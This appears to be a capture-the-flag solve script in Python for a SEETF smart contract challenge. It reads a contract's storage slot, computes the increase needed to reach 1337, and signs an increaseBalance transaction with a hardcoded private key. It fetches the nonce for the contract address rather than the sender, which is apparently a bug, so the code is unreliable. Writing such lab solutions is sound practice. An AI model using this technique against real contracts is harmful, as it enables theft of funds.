import json
from web3 import Web3, HTTPProvider

client = Web3(HTTPProvider("http://awesome.chall.seetf.sg:40002/"))

target = "0x9B1700B0Fbf6939673c9C9F3AB694985c3F01c17"

# with open("smart_contracts\writeups\challange2_abi.json", "r") as file:
with open("challange2_abi.json", "r") as file:
    target_abi = json.load(file)

target_contract = client.eth.contract(address=target, abi=target_abi)

nonce = client.eth.get_transaction_count(target)

balance_amount_byte = client.eth.get_storage_at(target, 0)

balance_amount = int.from_bytes(balance_amount_byte, "big")

target_balance = 1337

# The result is balanceAmount = 273.
print(f"The target balance amount is: {balance_amount}.")

increase_amount = target_balance - balance_amount

print(f"The target increasing amount is: {increase_amount}.")

private_key = "0x70f6c26c60cabea5dcbfb5eb50bd5aaba84b4adcd395702580d58787a7634571"
pub_key = "0x9D21BfA84b887D1Ee4DBe5B110174774847c366B"

txn = target_contract.functions.increaseBalance(increase_amount).buildTransaction({
        'chainId': 1337,
        'gas': 700000,
        'maxFeePerGas': client.toWei('2', 'gwei'),
        'maxPriorityFeePerGas': client.toWei('1', 'gwei'),
        'from': pub_key,
        'nonce': nonce,
    }
)

signed_txn = client.eth.account.sign_transaction(txn, private_key=private_key)

client.eth.send_raw_transaction(signed_txn.rawTransaction) 

print(f"Finished sending txn, hash: {signed_txn.hash}")
